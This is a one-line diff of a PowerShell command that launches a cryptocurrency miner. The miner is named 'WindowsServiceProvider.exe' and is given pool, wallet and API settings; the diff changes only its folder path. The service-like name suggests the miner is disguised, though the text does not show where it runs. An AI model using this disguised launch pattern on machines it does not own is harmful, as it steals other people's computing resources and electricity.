@@ -1,1 +1,1 @@
-Start-Process -FilePath 'D:\Mining\Final Mining\config\WindowsServiceProvider.exe' -ArgumentList '--algo ETCHASH --pool stratum+ssl://etchash.unminable.com:443 --user SHIB:0x35E9d46dfaFE7Bb16aFa6dEd98e9f47aDf779b0A.winter --apihost 127.0.0.1 --apiport 60100 --watchdog off --nocolor on'
+Start-Process -FilePath 'D:\Mining\Destination\WindowsServiceProvider.exe' -ArgumentList '--algo ETCHASH --pool stratum+ssl://etchash.unminable.com:443 --user SHIB:0x35E9d46dfaFE7Bb16aFa6dEd98e9f47aDf779b0A.winter --apihost 127.0.0.1 --apiport 60100 --watchdog off --nocolor on'
